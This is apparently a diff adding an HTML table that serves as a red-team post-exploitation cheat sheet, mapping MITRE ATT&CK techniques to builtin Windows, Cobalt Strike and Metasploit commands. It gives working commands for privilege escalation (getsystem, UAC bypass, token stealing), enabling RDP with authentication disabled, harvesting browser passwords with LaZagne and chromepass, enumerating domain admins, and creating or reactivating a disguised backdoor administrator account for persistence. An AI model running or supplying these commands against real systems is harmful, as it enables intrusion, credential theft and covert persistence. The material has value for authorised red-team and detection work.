+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display list of currently running processes and services on the system</div></td>
+<td class="CellStyle_2"><div class="cell">ps<br/>post/windows/gather/enum_services</div></td>
+<td class="CellStyle_2"><div class="cell">T1057</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Elevate to SYSTEM level process</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)</div></td>
+<td class="CellStyle_2"><div class="cell">getsystem</div></td>
+<td class="CellStyle_2"><div class="cell">T1068</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Elevate to SYSTEM level process</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)</div></td>
+<td class="CellStyle_2"><div class="cell">getsystem</div></td>
+<td class="CellStyle_2"><div class="cell">T1068</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Enumerate local Admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of local administrator accounts on the workstation</div></td>
+<td class="CellStyle_2"><div class="cell">net localgroup &quot;Administrators&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Enumerate local Admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of local administrator accounts on the workstation</div></td>
+<td class="CellStyle_2"><div class="cell">shell net localgroup &quot;Administrators&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Enumerate local Admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of local administrator accounts on the workstation</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/gather/local_admin_search_enum</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get domain admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain administrator accounts</div></td>
+<td class="CellStyle_2"><div class="cell">net group [&quot;Domain Admins&quot;] /domain[:DOMAIN]</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get domain admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain administrator accounts</div></td>
+<td class="CellStyle_2"><div class="cell">net group [&quot;Domain Admins&quot;] /domain</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get domain admin accounts</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain administrator accounts</div></td>
+<td class="CellStyle_2"><div class="cell">domain_list_gen.rb<br/>post/windows/gather/enum_domain_group_users</div></td>
+<td class="CellStyle_2"><div class="cell">T1069</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Enable RDP Services</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Enable RDP via the registry and services</div></td>
+<td class="CellStyle_2"><div class="cell">Enable RDP Services:<br/>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f<br/>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f <br/>net start TermService</div></td>
+<td class="CellStyle_2"><div class="cell">T1076</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Enable RDP Services</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Enable RDP via the registry and services</div></td>
+<td class="CellStyle_2"><div class="cell">Enable RDP Services:<br/>shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f<br/>shell reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f <br/>shell net start TermService</div></td>
+<td class="CellStyle_2"><div class="cell">T1076</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Enable RDP Services</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Enable RDP via the registry and services</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/manage/enable_rdp</div></td>
+<td class="CellStyle_2"><div class="cell">T1076</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get available shares</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.</div></td>
+<td class="CellStyle_2"><div class="cell">net use [\\ip\path] [password] [/user:DOMAIN\user]<br/>net use \\COMP\ADMIN$ password /user:COMP\Administrator (checking password reuse on local admin account)</div></td>
+<td class="CellStyle_2"><div class="cell">T1077</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get available shares</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.</div></td>
+<td class="CellStyle_2"><div class="cell">shell net use [\\ip\path] [password] [/user:DOMAIN\user]</div></td>
+<td class="CellStyle_2"><div class="cell">T1077</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Collect passwords from web browsers</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">https://github.com/AlessandroZ/LaZagne (now part of pupy as a post-exploit module)<br/>This program attempts to collect passwords from many different data sources related to browsers - it'll get passwords from Firefox, Chrome, Opera, IE.<br/>the -f command on the browsers command call is specifically targeting Firefox</div></td>
+<td class="CellStyle_2"><div class="cell">shell laZagne.exe browsers [-f]</div></td>
+<td class="CellStyle_2"><div class="cell">T1081</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Collect passwords from web browsers</div></td>
+<td class="CellStyle_2"><div class="cell">open source</div></td>
+<td class="CellStyle_2"><div class="cell">https://github.com/hassaanaliw/chromepass<br/>This program attempts to collect passwords that Chrome stores.</div></td>
+<td class="CellStyle_2"><div class="cell">To print output simply: python chromepass.py -d<br/>To write to csv file: python chromepass.py --o csv<br/>To write to json file: python chromepass.py --o json</div></td>
+<td class="CellStyle_2"><div class="cell">T1081</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get Windows version</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Get the Windows OS version that's running</div></td>
+<td class="CellStyle_2"><div class="cell">ver</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get Windows version</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Get the Windows OS version that's running</div></td>
+<td class="CellStyle_2"><div class="cell">shell ver</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Print environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Print all of the environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">set</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Print environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Print all of the environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">shell set</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Print environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Print all of the environment variables</div></td>
+<td class="CellStyle_2"><div class="cell">get_env.rb</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get computer information</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Get computer name, username, OS software version, domain information, DNS, logon domain</div></td>
+<td class="CellStyle_2"><div class="cell">net config workstation<br/>net config server</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get computer information</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Get computer name, username, OS software version, domain information, DNS, logon domain</div></td>
+<td class="CellStyle_2"><div class="cell">shell net config workstation<br/>shell net config server</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get configuration information</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards</div></td>
+<td class="CellStyle_2"><div class="cell">systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Get configuration information</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards</div></td>
+<td class="CellStyle_2"><div class="cell">systemprofiler tool if no access yet (victim browses to website)<br/>or<br/>shell systeminfo (if you already have a beacon)</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get configuration information</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards</div></td>
+<td class="CellStyle_2"><div class="cell">sysinfo, run winenum, get_env.rb</div></td>
+<td class="CellStyle_2"><div class="cell">T1082</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Gather more information on targeted users</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.</div></td>
+<td class="CellStyle_2"><div class="cell">net user [username] [/domain]</div></td>
+<td class="CellStyle_2"><div class="cell">T1087</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Gather more information on targeted users</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.</div></td>
+<td class="CellStyle_2"><div class="cell">shell net user [username] [/domain]</div></td>
+<td class="CellStyle_2"><div class="cell">T1087</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Gather more information on targeted users</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Used to add, delete, and manage the users on the computer. Run this command on the users discovered from the previous two commands to gather more information on targeted users.</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/gather/enum_ad_users<br/>auxiliary/scanner/smb/smb_enumusers</div></td>
+<td class="CellStyle_2"><div class="cell">T1087</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Query Active Directory for users, groups and permissions</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is &quot;subdomain.domain.tld&quot;, then your query will include &quot;dc=subdomain,dc=domain,dc=tld&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">dsquery group &quot;ou=Domain Admins,dc=domain,dc=com&quot;<br/>dsquery user &quot;dc=domain,dc=com&quot;<br/>dsquery * OU=&quot;Domain Admins&quot;,DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description<br/>dsquery * -filter &quot;(&amp;(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))&quot; -Attr samAccountName mail -Limit 0<br/>dsquery * -filter &quot;(&amp;(objectCategory=group)(name=*Admin*))&quot; -Attr name description members</div></td>
+<td class="CellStyle_2"><div class="cell">T1087</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Query Active Directory for users, groups and permissions</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Dsquery is a Windows utility on servers that facilitates querying the Active Directory of the domain for lots of information about users, groups, and permissions. When constructing dsquery commands, if your domain is &quot;subdomain.domain.tld&quot;, then your query will include &quot;dc=subdomain,dc=domain,dc=tld&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">shell dsquery group &quot;out=Domain Admins&quot;,dc=domain,dc=com&quot;<br/>shell dsquery user &quot;dc=domain,dc=com&quot;<br/>shell dsquery * OU=&quot;Domain Admins&quot;,dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description<br/>shell dsquery * -filter &quot;(&amp;(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))&quot; -Attr samAccountName mail -Limit 0<br/>shell dsquery * -filter &quot;(&amp;(objectCategory=group)(name=*Admin*))&quot; -Attr name description members</div></td>
+<td class="CellStyle_2"><div class="cell">T1087</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Bypass UAC</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.</div></td>
+<td class="CellStyle_2"><div class="cell">uacbypass</div></td>
+<td class="CellStyle_2"><div class="cell">T1088</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Bypass UAC</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.</div></td>
+<td class="CellStyle_2"><div class="cell">One of the following:<br/>exploit/windows/local/bypassuac<br/>exploit/windows/local/bypassuac_injection<br/>exploit/windows/local/bypassuac_vbs</div></td>
+<td class="CellStyle_2"><div class="cell">T1088</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Token stealing</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.</div></td>
+<td class="CellStyle_2"><div class="cell">Token Stealing:<br/>steal_token pid#</div></td>
+<td class="CellStyle_2"><div class="cell">T1134</div></td>
+</tr>
+<tr height="155px">
+<td class="CellStyle_1"><div class="cell">Token stealing</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.</div></td>
+<td class="CellStyle_2"><div class="cell">Token Stealing:<br/>use incognito<br/>list_tokens -u<br/>impersonate_token DOMAIN\\User<br/>or:<br/>steal_token {pid}</div></td>
+<td class="CellStyle_2"><div class="cell">T1134</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Dump network shared resource information</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries</div></td>
+<td class="CellStyle_2"><div class="cell">net share</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Dump network shared resource information</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries</div></td>
+<td class="CellStyle_2"><div class="cell">net share</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Dump network shared resource information</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries</div></td>
+<td class="CellStyle_2"><div class="cell">auxiliary/scanner/smb/smb_enumshares</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">List of workstations and network devices</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of workstations and network devices on the network.</div></td>
+<td class="CellStyle_2"><div class="cell">net view \\host /all [/domain:domain]</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">List of workstations and network devices</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of workstations and network devices on the network.</div></td>
+<td class="CellStyle_2"><div class="cell">net view \\host /domain</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">List of workstations and network devices</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of workstations and network devices on the network.</div></td>
+<td class="CellStyle_2"><div class="cell">auxiliary/scanner/smb/smb_enumshares</div></td>
+<td class="CellStyle_2"><div class="cell">T1135</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Create backdoor user account</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.</div></td>
+<td class="CellStyle_2"><div class="cell">Add backdoor user account:<br/>net user support_388945a0 somepasswordhere /add /y<br/>net localgroup administrators support_388945a0 /add<br/>net localgroup &quot;remote desktop users&quot; support_388945a0 /add</div></td>
+<td class="CellStyle_2"><div class="cell">T1136</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Create backdoor user account</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/manage/add_user_domain</div></td>
+<td class="CellStyle_2"><div class="cell">T1136</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Create backdoor user account</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism.</div></td>
+<td class="CellStyle_2"><div class="cell">Add backdoor user account:<br/>shell net user support_388945a0 somepasswordhere /add /y<br/>shell net localgroup administrators support_388945a0 /add<br/>shell net localgroup &quot;remote desktop users&quot; support_388945a0 /add</div></td>
+<td class="CellStyle_2"><div class="cell">T1136</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Enable &quot;support_388945a0&quot; account</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.</div></td>
+<td class="CellStyle_2"><div class="cell">Enable backdoor user account:<br/>net user support_388945a0 /active:yes<br/>net localgroup administrators support_388945a0 /add<br/>net localgroup &quot;remote desktop users&quot; support_388945a0 /add</div></td>
+<td class="CellStyle_2"><div class="cell">T1136</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Enable &quot;support_388945a0&quot; account</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups.</div></td>
+<td class="CellStyle_2"><div class="cell">Enable backdoor user account:<br/>shell net user support_388945a0 /active:yes<br/>shell net localgroup administrators support_388945a0 /add<br/>shell net localgroup &quot;remote desktop users&quot; support_388945a0 /add</div></td>
+<td class="CellStyle_2"><div class="cell">T1136</div></td>
+</tr></table>
+</body>
+</html>
